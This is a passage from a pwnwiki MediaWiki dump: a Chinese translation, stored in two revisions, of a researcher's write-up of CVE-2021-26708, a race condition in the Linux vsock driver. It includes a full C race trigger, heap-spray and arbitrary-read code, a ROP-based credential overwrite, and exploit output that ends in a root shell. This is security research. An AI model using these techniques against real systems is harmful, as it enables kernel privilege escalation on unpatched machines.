前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/translate&gt;

&lt;translate&gt;
==內核信息洩露== &lt;!--T:20--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:21--&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/translate&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:22--&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/translate&gt;

&lt;translate&gt;
==實現任意讀== &lt;!--T:23--&gt;
&lt;/translate&gt;

&lt;translate&gt;
===從 arbitrary free 到 use-after-free=== &lt;!--T:24--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:25--&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/translate&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:26--&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/translate&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;translate&gt;
&lt;!--T:27--&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/translate&gt;

&lt;translate&gt;
===任意讀的步驟=== &lt;!--T:28--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:29--&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/translate&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;translate&gt;
&lt;!--T:30--&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/translate&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;translate&gt;
&lt;!--T:31--&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/translate&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;translate&gt;
==尋找攻擊目標== &lt;!--T:32--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:33--&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。

&lt;!--T:34--&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/translate&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;translate&gt;
==在 sk_buff 上實現 Use-after-free== &lt;!--T:35--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:36--&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。

&lt;!--T:37--&gt;
我構建了以下步驟：

&lt;!--T:38--&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字

&lt;!--T:39--&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()

&lt;!--T:40--&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()

&lt;!--T:41--&gt;
4.對vsock_sock執行任意讀取過程

&lt;!--T:42--&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)

&lt;!--T:43--&gt;
6.對這個可能的sk_buff地址執行任意讀

&lt;!--T:44--&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6

&lt;!--T:45--&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上

&lt;!--T:46--&gt;
9.對sk_buff內核地址進行任意釋放

&lt;!--T:47--&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads

&lt;!--T:48--&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/translate&gt;

&lt;translate&gt;
==通過skb_shared_info 進行任意寫== &lt;!--T:49--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:50--&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/translate&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:51--&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/translate&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;translate&gt;
&lt;!--T:52--&gt;
下面講講destructor_arg 回調:
&lt;/translate&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:53--&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。

&lt;!--T:54--&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/translate&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;translate&gt;
==視頻== &lt;!--T:55--&gt;
&lt;/translate&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;

&lt;translate&gt;

==參考== &lt;!--T:56--&gt;
&lt;/translate&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>epm0nb353soxgq8npnf5susmz89cji8</sha1>
    </revision>
    <revision>
      <id>2163</id>
      <parentid>2094</parentid>
      <timestamp>2021-05-04T03:31:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>2163</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="25522" sha1="ae5vhtig5rw7mjrl5krigls54ncjkku" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==脆弱點== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。

&lt;!--T:3--&gt;
&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/translate&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/translate&gt;


&lt;translate&gt;
==內存破壞== &lt;!--T:5--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:6--&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/translate&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;translate&gt;
&lt;!--T:7--&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/translate&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:8--&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/translate&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:9--&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。

&lt;!--T:10--&gt;
內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/translate&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:11--&gt;
這裡，vvs是指向內核內存的指針，它已經在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被釋放。 &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小為64字節，位於kmalloc-64塊緩存中。 buf_alloc字段類型為u32，位於偏移量40。 &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。 *val的值由攻擊者控制，它的四個最不重要的字節被寫入釋放的內存中。
&lt;/translate&gt;

&lt;translate&gt;

==模糊測試== &lt;!--T:12--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:13--&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/translate&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:14--&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/translate&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:15--&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/translate&gt;

&lt;translate&gt;
==四字節的力量== &lt;!--T:16--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:17--&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。

&lt;!--T:18--&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/translate&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:19--&gt;
